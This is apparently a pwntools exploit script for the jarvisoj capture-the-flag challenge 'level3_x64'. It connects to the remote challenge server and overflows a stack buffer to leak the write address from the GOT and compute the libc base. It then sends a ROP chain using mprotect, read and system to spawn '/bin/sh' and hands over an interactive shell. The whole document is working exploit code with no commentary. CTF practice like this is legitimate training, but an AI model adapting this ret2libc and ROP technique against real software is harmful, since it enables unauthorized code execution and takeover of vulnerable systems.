# coding:utf-8

from pwn import *
from time import sleep

libc = ELF("./libc-2.19.so")
elf = ELF("./level3_x64")

pwn = remote("pwn2.jarvisoj.com", 9884)
context.log_level = 'debug'

mprotect_addr = libc.symbols['mprotect']
write_got = elf.got['write']
main = 0x00000000040061A
write_offset = libc.symbols['write']
write_plt = elf.symbols['write']
read_plt = elf.symbols['read']


OVERFLOW_OFFSET = 0x80+8
# SHELLCODE = asm(shellcraft.amd64.linux.sh())
system_offset = libc.symbols['system']

pop_rdi_ret = 0x00000000004006b3
pop_rsi_ret = 0x00000000004006b1
pop_rdx_ret_offset = 0x0000000000001b8e

gadget1 = 0x0000000004006AA # pop_rbx_rbp_r12_r13_r14_r15_ret
gadget2 = 0x000000000400690 # mov rdx,r13;mov rsi,r14;mov edi r15;call r12+rbx*8

def leak_write_got():
    pwn.recvuntil("Input:\n")
    # write(1, write_got, 0xa)
    payload = "a"*OVERFLOW_OFFSET +p64(pop_rdi_ret) +p64(1) + p64(pop_rsi_ret) + p64(write_got) + p64(write_plt) + p64(main)
    pwn.send(payload)
    write_addr =u64(pwn.recv(8))
    sleep(1)
    print "write address is :",hex(write_addr)
    return write_addr


base_addr = leak_write_got() - write_offset

pop_rdx_ret = pop_rdx_ret_offset+base_addr
bss_addr = 0x0000000000600b00 + 0x100

# mprotect(bss_addr, 0x1000, 7)
payload = "a"*OVERFLOW_OFFSET + p64(pop_rdi_ret) + p64(bss_addr) + p64(pop_rsi_ret) + p64(0x1000) + p64(pop_rdx_ret) + p64(7)
# read(0, bss_addr, 0x100)
payload += p64(mprotect_addr+base_addr) + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(bss_addr) # + p64(pop_rdx_ret) + p64(0x100)
# payload += p64(read_plt) + p64(bss_addr)
payload += p64(read_plt) + p64(pop_rdi_ret) + p64(bss_addr) + p64(system_offset+base_addr)

pwn.recvuntil("Input:\n")
pwn.send(payload)
sleep(1)
# pwn.send(SHELLCODE)
pwn.send("/bin/sh\x00")

pwn.interactive()